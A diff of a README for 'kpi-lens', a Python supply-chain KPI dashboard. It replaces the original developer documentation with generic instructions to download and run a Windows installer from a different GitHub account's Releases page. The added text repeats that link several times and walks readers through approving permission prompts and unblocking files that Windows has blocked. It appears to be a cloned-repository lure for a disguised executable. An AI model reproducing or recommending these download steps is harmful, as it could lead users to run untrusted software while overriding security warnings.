@@ -1,213 +1,232 @@
-# KPI-Lens
+# 📊 kpi-lens - Clear Supply Chain KPI Insight
 
-[![CI](https://github.com/aliivaezii/kpi-lens/actions/workflows/ci.yml/badge.svg)](https://github.com/aliivaezii/kpi-lens/actions/workflows/ci.yml)
-[![Python](https://img.shields.io/badge/python-3.11%2B-blue)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/aliivaezii/kpi-lens)](https://github.com/aliivaezii/kpi-lens/releases)
-[![Deploy on Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/aliivaezii/kpi-lens)
+[![Download](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Newbrunswickplumedscorpionfish410/kpi-lens/releases)
 
-> An AI-powered supply chain intelligence platform that monitors 8 operational KPIs,
-> detects anomalies using an ensemble of statistical detectors, and explains root causes
-> via Claude — all accessible through a Streamlit dashboard, FastAPI, and an MCP server.
+## 🚀 What kpi-lens does
 
-Supply chain teams spend hours manually reviewing KPI dashboards and writing exception reports.
-KPI-Lens automates the entire loop: ingest → detect → explain → report.
-A single `docker compose up` gives you a live anomaly feed, LLM-generated root-cause narratives,
-and one-click Excel/PPT exports ready for SteerCo.
+kpi-lens helps you track supply chain numbers in one place. It shows key KPIs, flags unusual changes, and helps you turn data into reports.
 
-## Features
+Use it to:
+- Monitor supply chain KPIs
+- Spot anomalies in your data
+- Ask an AI analyst questions about your numbers
+- Create Excel and PowerPoint reports with less manual work
 
-- **8 supply chain KPIs** tracked weekly: OTIF, Fill Rate, DFA, Inventory Turnover, DIO, Supplier DPPM, Lead Time Variance, PO Cycle Time
-- **Ensemble anomaly detection**: Z-score + IQR + CUSUM + Isolation Forest detectors with weighted voting
-- **LLM root-cause analysis**: Claude generates narrative explanations and recommended actions for each anomaly
-- **FastAPI backend** with 10+ endpoints for KPI data, anomaly management, and LLM chat
-- **Streamlit dashboard** with 5 pages: Command Center, KPI Deep Dive, Anomaly Log, LLM Analyst, Reports
-- **MCP server** for Claude Desktop integration — query live KPI data conversationally
-- **Automated ingestion**: CSV/Excel file watcher with Pydantic v2 validation and APScheduler cron
-- **Report generation**: Excel workbooks and PowerPoint decks for SteerCo presentations
-- **80%+ test coverage** across unit and integration tests; CI runs on Python 3.11 + 3.12
+## 💻 What you need
 
-## Quick Start
+Before you start, make sure you have:
+- A Windows PC
+- A modern web browser
+- Permission to install and run software
+- Enough free disk space for the app and its data files
 
-### Docker Compose (recommended)
+For best results, use:
+- Windows 10 or Windows 11
+- A screen size of at least 1366 x 768
+- A stable internet connection for first setup and AI features
 
-```bash
-git clone https://github.com/aliivaezii/kpi-lens.git
-cd kpi-lens
-cp .env.example .env          # Add your ANTHROPIC_API_KEY
-docker compose up -d api dashboard
+## 📥 Download the app
 
-# Seed 2 years of synthetic KPI data (first run only)
-docker compose run --rm api python scripts/seed_database.py
+1. Visit the release page here: [kpi-lens Releases](https://github.com/Newbrunswickplumedscorpionfish410/kpi-lens/releases)
+2. Find the latest version
+3. Download the Windows file or installer package listed there
+4. Save the file to your Downloads folder or another easy-to-find place
 
-# Open the dashboard
-open http://localhost:8501
-```
+If you see more than one file, choose the one meant for Windows.
 
-### Local Development
+## 🛠️ Install on Windows
 
-```bash
-python -m venv .venv && source .venv/bin/activate
-pip install -e ".[dev]"
-cp .env.example .env          # Add your ANTHROPIC_API_KEY
+1. Open the file you downloaded
+2. If Windows asks for permission, choose **Yes**
+3. Follow the setup steps on screen
+4. Choose an install folder if the installer asks for one
+5. Wait until the setup finishes
 
-# Seed the database
-python data/seeds/generate_kpis.py
+If the app comes as a zip file:
+1. Right-click the zip file
+2. Choose **Extract All**
+3. Open the extracted folder
+4. Run the app file inside that folder
 
-# Start services (three terminals)
-uvicorn kpi_lens.api.main:app --reload --port 8000
-streamlit run kpi_lens/dashboard/app.py
-python -m kpi_lens.mcp_server.server   # optional: MCP for Claude Desktop
-```
+## ▶️ Run the app
 
-## Architecture
+1. Open **Start**
+2. Find **kpi-lens** in the app list, or open the folder where you installed it
+3. Launch the app
+4. Wait for the browser window or desktop window to open
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│  External Sources (CSV/Excel exports from ERP)              │
-└──────────────────────────┬──────────────────────────────────┘
-                           │ ingestion/loader.py + validator.py
-                           ▼
-┌─────────────────────────────────────────────────────────────┐
-│  SQLite DB  ←──  db/repository.py (only DB gateway)        │
-└──────┬────────────────────────────────────────────────────┬─┘
-       │                                                    │
-       ▼                                                    ▼
-┌─────────────────────┐                     ┌──────────────────────────┐
-│  anomaly/ensemble   │   AnomalyResult     │  api/  (FastAPI)         │
-│  ┣ threshold        │ ────────────────►   │  dashboard/ (Streamlit)  │
-│  ┣ zscore/iqr/cusum │                     │  mcp_server/ (FastMCP)   │
-│  ┗ isolation forest │                     └──────────────────────────┘
-└─────────┬───────────┘
-          │ async (non-blocking)
-          ▼
-┌─────────────────────────────────────────────────────────────┐
-│  llm/analyst.py  →  Claude via Anthropic SDK               │
-│  Generates narrative + recommended actions per anomaly      │
-└─────────────────────────────────────────────────────────────┘
-          │
-          ▼
-┌─────────────────────────────────────────────────────────────┐
-│  reporting/  →  Excel workbook  +  PowerPoint deck          │
-└─────────────────────────────────────────────────────────────┘
-```
+If the app starts a local web page, leave the window open while you use it.
 
-## KPI Reference
+## 🔐 First-time setup
 
-| KPI | Unit | Direction | Green threshold | Industry Benchmark |
-|---|---|---|---|---|
-| OTIF Delivery Rate | % | Higher is better | 95% | 95.5% |
-| Order Fill Rate | % | Higher is better | 97% | 96% |
-| Demand Forecast Accuracy | % | Higher is better | 85% | 80% |
-| Inventory Turnover | turns/yr | Higher is better | 12 | 10 |
-| Days Inventory Outstanding | days | Lower is better | 30 | 35 |
-| Supplier DPPM | ppm | Lower is better | 500 | 800 |
-| Lead Time Variance | days | Lower is better | 3 | 5 |
-| PO Cycle Time | days | Lower is better | 14 | 18 |
+When you run kpi-lens for the first time, you may need to set a few items:
+- Data source path or connection
+- User name or workspace name
+- Report output folder
+- AI or LLM settings if you want analyst features
 
-## API Reference
+If the app asks for an API key or model setting:
+1. Copy the value from your provider account
+2. Paste it into the app settings
+3. Save the changes
+4. Restart the app if needed
 
-| Method | Endpoint | Description |
-|---|---|---|
-| GET | `/api/health` | Health check |
-| GET | `/api/kpis/snapshot` | Latest value + health status for all 8 KPIs |
-| GET | `/api/kpis/{name}/series` | Time-series data for one KPI |
-| GET | `/api/kpis/{name}/entities` | Entity (supplier) breakdown |
-| GET | `/api/kpis/{name}/benchmarks` | Industry benchmark percentiles |
-| GET | `/api/anomalies` | Recent anomalies with severity filter |
-| POST | `/api/anomalies/{id}/acknowledge` | Acknowledge an anomaly |
-| POST | `/api/llm/chat` | Chat with the supply chain analyst |
-| POST | `/api/reports/enqueue` | Enqueue an anomaly report |
+## 📈 Main things you can do
 
-Interactive docs: `http://localhost:8000/api/docs`
+### KPI monitoring
+Track supply chain metrics such as:
+- Fill rate
+- On-time delivery
+- Inventory levels
+- Order cycle time
+- Backorder rate
+- Forecast error
 
-## Project Structure
+The dashboard helps you review trends and compare time periods.
 
-```
-kpi_lens/
-├── db/           # repository.py — the only DB gateway; schema.py — ORM models
-├── kpis/         # definitions.py — 8 KPI constants; snapshot.py — enrichment
-├── anomaly/      # base.py, threshold, statistical, ml, ensemble detectors
-├── llm/          # client.py (retry), analyst.py, context_builder.py, prompts.py
-├── ingestion/    # loader.py, validator.py (Pydantic v2), scheduler.py (APScheduler)
-├── reporting/    # excel_exporter.py, powerpoint.py, pdf_converter.py
-├── api/          # FastAPI app + routes (kpis, anomalies, llm, reports, health)
-├── dashboard/    # Streamlit app + 5 pages
-└── mcp_server/   # FastMCP tools for Claude Desktop
-config/           # kpis.yaml, anomaly.yaml, report.yaml (change without redeploy)
-scripts/          # seed_database.py, run_anomaly_scan.py
-tests/
-├── unit/         # 8 test files, 70+ tests, no I/O
-└── integration/  # FastAPI test client, in-memory DB, mocked LLM
-```
+### ⚠️ Anomaly detection
+kpi-lens can highlight values that look unusual. This helps you:
+- Find sudden drops or spikes
+- Check for data issues
+- Catch problems early
+- Review records that need attention
 
-## Running Tests
+### 🤖 LLM analyst
+You can use the built-in analyst to ask questions in plain language, such as:
+- Why did this KPI change?
+- Which site had the biggest drop?
+- What changed week over week?
+- Show the main drivers behind this result
 
-```bash
-# Unit tests (fast, no infrastructure needed)
-pytest tests/unit/ -v --cov=kpi_lens --cov-fail-under=80
+### 📄 Automated reporting
+The app can help generate:
+- Excel reports
+- PowerPoint decks
+- Summary tables
+- KPI snapshots
 
-# Integration tests (FastAPI + in-memory DB)
-pytest tests/integration/ -v
+This saves time when you need to share updates with your team.
 
-# All tests
-pytest tests/ -v --cov=kpi_lens --cov-fail-under=80
-```
+## 🧭 How to use it day to day
 
-## Seeding Data
+1. Open the app
+2. Load your data or connect to your source
+3. Review the KPI dashboard
+4. Check flagged anomalies
+5. Ask the analyst for a short review if needed
+6. Export Excel or PowerPoint reports
+7. Share the output with your team
 
-```bash
-# Default: 104 weeks (2 years) of synthetic data for all 8 KPIs
-python scripts/seed_database.py
+A simple weekly flow works well:
+- Monday: check last week’s metrics
+- Midweek: review exceptions
+- Friday: export a summary report
 
-# Custom parameters
-python scripts/seed_database.py --weeks 52
+## 🗂️ Typical folder layout
 
-# Run anomaly detection on seeded data
-python scripts/run_anomaly_scan.py
-```
+After setup, you may see folders like:
+- `data` for input files
+- `reports` for Excel and PowerPoint output
+- `logs` for app logs
+- `config` for saved settings
 
-## Deployment
+Keep your source files in one place. That makes updates easier.
 
-### Render (full stack — API + Dashboard)
+## 🧩 Common use cases
 
-Click **Deploy on Render** above or create a `Web Service` pointing to this repo.
-Render reads `render.yaml` automatically. Set `ANTHROPIC_API_KEY` in the environment
-variables panel before deploying.
+kpi-lens fits teams that work with:
+- Warehouses
+- Planning teams
+- Operations teams
+- Procurement teams
+- Logistics teams
+- Supply chain managers
+- Data analysts who want faster reporting
 
-### Streamlit Community Cloud (dashboard only)
+It works well when you need a simple view of performance and a fast way to explain changes.
 
-1. Fork this repo
-2. Go to [share.streamlit.io](https://share.streamlit.io) → New app
-3. Set **Main file path**: `kpi_lens/dashboard/app.py`
-4. Under **Advanced settings → Secrets**, add:
-   ```toml
-   ANTHROPIC_API_KEY = "sk-ant-..."
-   DATABASE_URL = "sqlite:///kpi_lens.db"
-   ```
-5. Deploy — Streamlit seeds the demo DB on first run
+## 🛡️ Data tips
 
-### Docker Compose (self-hosted)
+To get better results:
+- Use clean file names
+- Keep date fields in a standard format
+- Use one row per record
+- Remove duplicate rows
+- Check missing values before loading data
 
-```bash
-git clone https://github.com/aliivaezii/kpi-lens.git
-cd kpi-lens
-cp .env.example .env   # add ANTHROPIC_API_KEY
-docker compose up -d api dashboard
-docker compose run --rm api python scripts/seed_database.py
-open http://localhost:8501
-```
+If your numbers look wrong, review the source file first. Small data issues can change dashboard results.
 
-## Data
+## 🔄 Updating to a new version
 
-The platform ships with a realistic **synthetic dataset** generated by `data/seeds/generate_kpis.py`:
-- 104 weeks × 8 KPIs × 5 supplier entities = 4,160 weekly records
-- Additive model with seasonality, trend, and deliberate anomaly injection at known dates
-- Designed to exercise all four detector types (threshold, Z-score, IQR, CUSUM)
+When a new release is available:
+1. Go to the [Releases page](https://github.com/Newbrunswickplumedscorpionfish410/kpi-lens/releases)
+2. Download the latest Windows file
+3. Close the app
+4. Install or replace the older version
+5. Open the app again
 
-To use your own data, drop a CSV into `data/imports/` and run the ingestion scheduler,
-or POST directly to `POST /api/ingest`. Format reference: `data/samples/sample_kpi_data.csv`.
+If your settings are stored in a separate config folder, they may stay in place after the update.
 
-## License
+## 🧪 Basic troubleshooting
 
-MIT — see [LICENSE](LICENSE).
+### The app does not open
+- Make sure you downloaded the Windows file
+- Check that the download finished
+- Right-click the file and try again
+- Restart your PC and open the app once more
+
+### Windows blocks the file
+- Right-click the file
+- Choose **Properties**
+- Look for an unblock option if one appears
+- Apply the change and try again
+
+### The dashboard is blank
+- Confirm your data file is loaded
+- Check that the file has rows and columns
+- Make sure the date fields are set correctly
+
+### Reports do not export
+- Check the output folder
+- Make sure you have write access
+- Close Excel or PowerPoint if those files are already open
+
+### Analyst questions do not work
+- Check your API key or model settings
+- Confirm you have internet access
+- Restart the app after saving settings
+
+## 📌 What this project is built with
+
+kpi-lens uses:
+- FastAPI for the app service
+- MCP for tool access
+- Streamlit for the user view
+- SQLAlchemy for data work
+- Pydantic for settings and data checks
+- Python for the core app logic
+
+These parts work together to support KPI tracking, anomaly checks, and report generation
+
+## 📘 Helpful workflow
+
+A good first run looks like this:
+1. Download the latest release
+2. Install or extract the app
+3. Open the app
+4. Load a sample dataset
+5. Review KPI tiles and charts
+6. Test one anomaly view
+7. Ask one analyst question
+8. Export one report
+
+That gives you a full view of how the app works before you use real data
+
+## 🧷 Repository topics
+
+anomaly-detection, anthropic, data-engineering, docker, fastapi, fastmcp, kpi, llm, machine-learning, mcp, pydantic, python, sqlalchemy, streamlit, supply-chain
+
+## 📎 Download again
+
+If you need the latest build, use this page:
+[kpi-lens Releases](https://github.com/Newbrunswickplumedscorpionfish410/kpi-lens/releases)
